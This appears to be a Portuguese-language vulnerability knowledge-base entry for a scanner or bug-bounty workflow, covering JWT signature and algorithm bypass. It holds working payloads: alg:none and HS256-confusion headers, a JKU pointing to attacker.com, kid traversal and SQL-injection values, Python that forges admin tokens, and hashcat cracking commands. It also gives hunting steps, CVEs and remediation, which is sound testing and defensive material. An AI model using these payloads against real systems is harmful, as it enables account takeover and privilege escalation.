---
id: jwt_signature_bypass
title: "JWT Signature and Algorithm Bypass"
module: "jwt"
severity: "CRITICAL"
cwe_id: "CWE-347"
cwe_title: "Improper Verification of Cryptographic Signature"
cvss_vector: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
vrt_id: "broken_authentication_and_session_management.authentication_bypass.json_web_token_vulnerability"
---

## Summary
Falhas na validação de JWT permitem forjar tokens, escalar privilégios e assumir contas. As variações mais comuns são `alg:none`, confusão RS256→HS256, injeção de JWK/JKU e `kid` controlável.

## Description
Um JWT é composto por header, payload e assinatura, codificados em Base64URL. O servidor deve validar a assinatura com uma chave confiável e aceitar apenas algoritmos explicitamente permitidos. Quando o header `alg` controla a verificação, o atacante pode:

- Trocar `alg` para `none` e remover a assinatura, se a biblioteca aceitar tokens não assinados.
- Trocar `RS256` por `HS256` e usar a chave pública RSA (conhecida) como segredo HMAC, quando o servidor não fixa o algoritmo.
- Injetar uma chave via `jwk`, `jku` ou `x5u`, apontando para um JWKS controlado pelo atacante.
- Explorar `kid` em SQL injection, path traversal ou leitura de arquivo para escolher uma chave previsível.
- Explorar segredo HMAC fraco (força bruta offline) ou validação de assinatura ausente em algum endpoint.

O problema é agravado por bibliotecas antigas, implementações caseiras, aceitação de `alg` do token, falta de validação de `iss`, `aud`, `exp`, `nbf` e confiança cega em JWKS remoto.

## Impact
- Bypass total de autenticação e autorização; acesso a qualquer conta ou painel administrativo.
- Escalada de privilégios (usuário comum → admin) e acesso a dados de outros tenants.
- Forja de identidade em APIs, webhooks e integrações machine-to-machine.
- Persistência: tokens de longa duração permitem acesso contínuo mesmo após troca de senha, se não houver revogação.
- Impacto regulatório e financeiro severo; normalmente CRITICAL.

## Payloads and Bypasses
```text
# Token original
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciJ9.<sig> # nosemgrep: generic.secrets.security.detected-jwt-token

# 1) alg:none (remover assinatura; manter o ponto final)
{"alg":"none","typ":"JWT"}
{"alg":"None","typ":"JWT"}
{"alg":"NONE","typ":"JWT"}

# 2) Confusão RS256 -> HS256 (assinar com a chave pública PEM)
{"alg":"HS256","typ":"JWT"}

# 3) Injeção de JWK
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}

# 4) JKU controlado
{"alg":"RS256","typ":"JWT","jku":"https://attacker.com/jwks.json"}

# 5) kid traversal / SQLi
{"alg":"HS256","typ":"JWT","kid":"../../../../dev/null"}
{"alg":"HS256","typ":"JWT","kid":"key1' UNION SELECT 'known-secret'-- -"}
{"alg":"HS256","typ":"JWT","kid":"/etc/passwd"}
```

Geração de token `none` e HS256:
```python
import base64, json, hmac, hashlib

def b64(o):
    return base64.urlsafe_b64encode(json.dumps(o, separators=(',', ':')).encode()).rstrip(b'=').decode()

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "1", "role": "admin"}
print(f"{b64(header)}.{b64(payload)}.")

# HS256 usando a chave pública RSA como segredo
secret = open("public.pem", "rb").read()
h = b64({"alg": "HS256", "typ": "JWT"})
p = b64({"sub": "1", "role": "admin"})
sig = base64.urlsafe_b64encode(hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest()).rstrip(b'=').decode()
print(f"{h}.{p}.{sig}")
```

Teste e força bruta:
```bash
# Enviar token
curl -s https://alvo.com/api/me -H "Authorization: Bearer $TOKEN"

# Crack de segredo HMAC fraco
hashcat -a 0 -m 16500 jwt.txt rockyou.txt
john --wordlist=rockyou.txt --format=HMAC-SHA256 jwt.txt
```

Variações de bypass de WAF/filtros:
```text
- Base64URL sem padding; padding aceito de forma permissiva
- Header com duplicatas: {"alg":"RS256","alg":"none"}
- Case variations: None, NONE, nOnE
- Espaços e comentários no JSON
- Assinatura vazia, truncada ou de outro token
- `crit`/`b64` headers para alterar parsing
- Endpoints alternativos que não validam assinatura (ex.: /api/internal, /debug)
```

Casos reais e mentalidade de ataque (RWBH): em APIs mobile e SSO de programas como Uber, Twitter e Yahoo, o padrão é testar `alg:none`, trocar RS256 por HS256 e procurar segredos fracos antes de partir para injeção de JWK/JKU.

## Target Context (Crawler Hints)
- **Parâmetros comuns:** `Authorization: Bearer`, `token`, `jwt`, `id_token`, `access_token`, `refresh_token`, `code`.
- **Paths comuns:** `/api/me`, `/api/v1/user`, `/oauth/token`, `/oauth/introspect`, `/.well-known/jwks.json`, `/login`, `/admin`, `/graphql`.
- **Sinais:** JWT em cookies (`access_token`, `session`), header `alg` refletido, JWKS público, `kid` previsível, ausência de `exp`/`aud`.

## Notable CVEs

| CVE | Produto | Ano | Descricao | Tecnica |
|-----|---------|-----|-----------|---------|
| CVE-2018-0114 | Cisco node-jose | 2018 | Atacante re-assina tokens usando chave embarcada no proprio token | JWK Injection |
| CVE-2018-1000539 | Nov json-jwt (Ruby) | 2018 | Verificacao incorreta de assinatura em AES-GCM JWE | Signature Bypass |
| CVE-2019-7644 | Auth0 WCF-Service-JWT | 2019 | Assinatura esperada vazada em mensagem de erro | Signature Disclosure |
| CVE-2019-20933 | InfluxDB | 2020 | Bypass de autenticacao via SharedSecret vazio no JWT | Empty Secret |
| CVE-2020-15084 | Auth0 express-jwt | 2020 | Campo algorithms nao enforced -- fallback para none | alg:none Bypass |
| CVE-2020-28042 | ServiceStack | 2020 | Verificacao de assinatura aceita tokens com signature de tamanho zero | Null Signature |
| CVE-2021-46743 | Firebase PHP-JWT | 2022 | Confusao de algoritmo RS256/HS256 via kid em key ring misto | Algorithm Confusion |
| CVE-2022-21449 | Oracle Java SE 17/18 | 2022 | "Psychic Signatures" -- ECDSA aceita assinatura (0,0) como valida | ECDSA Bypass |
| CVE-2022-23540 | Auth0 jsonwebtoken | 2022 | jwt.verify() sem algoritmo definido faz fallback para none | alg:none Bypass |
| CVE-2022-39227 | python-jwt | 2022 | Spoofing de identidade por manipulacao de claims verificados | Token Forgery |
| CVE-2024-21664 | lestrrat-go/jwx | 2024 | Campo signature presente em payload JSON causa parsing incorreto | Signature Bypass |
| CVE-2024-37568 | Authlib (Python) | 2024 | Confusao de algoritmo -- HMAC verificado com chave publica assimetrica | Algorithm Confusion |
| CVE-2024-54150 | xmidt-org cjwt (C) | 2024 | Confusao de tipo de assinatura permite bypass completo | Algorithm Confusion |

## Escalation Techniques
JWT comprometido e um dos caminhos mais diretos para account takeover e movimento lateral:

- **JWT alg:none + escalacao de privilegios:** forjar token com `role: admin` ou `tenant_id` de outro cliente. Um unico bypass de alg:none da account takeover completo e acesso cross-tenant a dados de outros clientes. Conforme descrito no Bug Bounty Bootcamp, se o campo `alg` aceita `none`, tokens com assinatura vazia sao considerados validos -- permitindo impersonar qualquer usuario.
- **Confusao de algoritmo + SSRF:** combinar confusao RS256-para-HS256 com um SSRF que vaza a chave publica (ex: `/.well-known/jwks.json` atras de firewall). O SSRF fornece o material de chave necessario para assinar tokens arbitrarios. O livro destaca que quando o algoritmo e trocado para HMAC, o token pode ser assinado com a chave publica RSA.
- **kid injection + LFI/SQLi:** um header `kid` controlavel pode ser encadeado com path traversal (`/dev/null` como chave HMAC = string vazia) ou SQL injection para extrair segredos do banco. Isso transforma uma fraqueza JWT em RCE ou exfiltracao completa de dados.
- **JWT forjado + OAuth token exchange:** usar um access token forjado para chamar endpoint de token exchange (`urn:ietf:params:oauth:grant-type:token-exchange`) e obter tokens para servicos downstream, habilitando movimento lateral entre microsservicos.
- **Segredo HMAC fraco + persistencia:** crackear segredo HMAC curto offline com hashcat, depois forjar tokens com claims `exp` arbitrarios. Isso da acesso persistente mesmo apos reset de senha, se o servidor nao tem revogacao de tokens (denylist/jti). O livro menciona que se a chave nao e complexa o suficiente, brute-force e viavel.
- **Informacao sensivel no payload:** como o JWT nao e criptografado por padrao, qualquer pessoa pode decodificar o payload em base64 e ler informacoes sensiveis (emails, roles, IDs internos). O Bug Bounty Bootcamp alerta que uma assinatura correta garante integridade, nao confidencialidade.

## Hunting Methodology
Processo passo a passo para identificar falhas em JWT:

1. **Coletar tokens:** capturar JWTs de headers `Authorization`, cookies, parametros de URL e requests de upgrade WebSocket. Decodificar cada um com `base64 -d` ou jwt.io para inspecionar `alg`, `kid`, `jku`, `jwk`, `x5u` e a estrutura de claims.
2. **Testar variantes de alg:none:** substituir `alg` por `none`, `None`, `NONE`, `nOnE`. Remover a assinatura mas manter o ponto final. Enviar para cada endpoint autenticado e verificar se o acesso e concedido. O Bug Bounty Bootcamp descreve esse teste como o primeiro a ser feito.
3. **Testar confusao de algoritmo (RS256 -> HS256):** obter a chave publica do servidor de `/.well-known/jwks.json`, `/oauth/certs` ou do certificado TLS. Re-assinar o token com HS256 usando o PEM da chave publica como segredo HMAC. Se o servidor usa um unico `verify()` que confia no `alg` do token, vai validar.
4. **Testar injecao de JWK/JKU/x5u:** adicionar claim `jwk` com par de chaves RSA proprio, ou setar `jku`/`x5u` para URL controlada pelo atacante com JWKS. Assinar com a chave privada correspondente. Monitorar requests de saida do servidor (Burp Collaborator ou interactsh).
5. **Testar manipulacao de kid:** tentar path traversal (`../../../../dev/null`, `/etc/hostname`), SQL injection (`' UNION SELECT 'secret'-- -`) e paths de arquivos vazios conhecidos como valores de `kid`. Assinar com a chave previsivel correspondente (string vazia para `/dev/null`).
6. **Brute-force de segredos fracos:** extrair o JWT e rodar `hashcat -a 0 -m 16500 jwt.txt rockyou.txt` ou `jwt-cracker`. Se crackeado, forjar tokens com claims escalados para confirmar impacto.
7. **Verificar validacao de claims:** testar tokens com `exp` expirado, `aud` incorreto, `iss` alterado. Se o servidor aceita claims invalidos, a validacao e incompleta.

## False Positive Indicators
Sinais de que o finding de JWT **nao e exploravel**:

- **Token rejeitado apesar de alg:none aceito no parsing:** algumas bibliotecas parsam o header mas ainda enforcam validacao de assinatura em camada separada (ex: API gateway valida antes da aplicacao ver o token). Confirmar pela resposta HTTP -- 200 com dados autenticados e true positive; 401/403 e false positive.
- **Endpoint JWKS retorna chaves publicas mas algoritmo e fixo server-side:** a presenca de um `/.well-known/jwks.json` publico nao e vulnerabilidade. So se torna uma se o servidor confia em `alg`/`jku`/`jwk` do header do token ao inves de sua propria configuracao.
- **Token expirado ou de teste na evidencia do scan:** se o scanner testou com token ja expirado e recebeu 401, o finding pode refletir rejeicao por expiracao, nao validacao de assinatura. Re-testar com token forjado fresco e nao expirado.
- **WAF ou CDN rejeitando tokens malformados antes da aplicacao:** Cloudflare, AWS ALB e intermediarios similares podem remover ou rejeitar tokens com `alg:none` antes do backend processar. A vulnerabilidade pode existir na camada da aplicacao mas estar mitigada por infraestrutura -- notar a distincao no report.
- **Endpoints diferentes com validacao diferente:** o scanner pode testar `/api/public` que nao valida JWTs (sem auth necessario) e reportar como aceitando `alg:none`. Confirmar contra endpoint que realmente exige autenticacao.
- **Gateway adicionando/substituindo token:** em arquiteturas de API gateway, o gateway pode substituir o token do cliente por um token interno antes de encaminhar ao backend. O token malicioso nunca chega a aplicacao.

## Recommendation
1. Fixar o algoritmo esperado por endpoint; nunca confiar no `alg` do token. Rejeitar `none` explicitamente.
2. Usar bibliotecas maduras e atualizadas (jjwt, Nimbus JOSE+JWT, Spring Security OAuth2 Resource Server) e validar `iss`, `aud`, `exp`, `nbf`, `iat`, `sub`.
3. Para RS256/ES256, validar a assinatura com chave pública fixa ou JWKS confiável por `issuer`; bloquear `jwk`, `jku`, `x5u` controlados pelo cliente.
4. Sanitizar `kid` com allowlist de IDs conhecidos; nunca usar `kid` em SQL, shell ou path sem validação.
5. Usar segredos HMAC de pelo menos 256 bits, armazenados em KMS/Secret Manager, com rotação.
6. Preferir algoritmos assimétricos (ES256/EdDSA) para tokens entre serviços e validar `typ`/`cty`.
7. Implementar revogação (denylist/`jti`), rotação de chaves com `kid` e tempos de vida curtos para access tokens.
8. Exemplo Spring Security:
```java
@Bean
JwtDecoder jwtDecoder() {
    NimbusJwtDecoder decoder = NimbusJwtDecoder.withPublicKey(publicKey).build();
    OAuth2TokenValidator<Jwt> withIssuer = JwtValidators.createDefaultWithIssuer("https://issuer");
    decoder.setJwtValidator(withIssuer);
    return decoder;
}
```
9. Adicionar testes de regressão que rejeitam `alg:none`, HS256 com chave pública, `jku` externo e `kid` inválido.
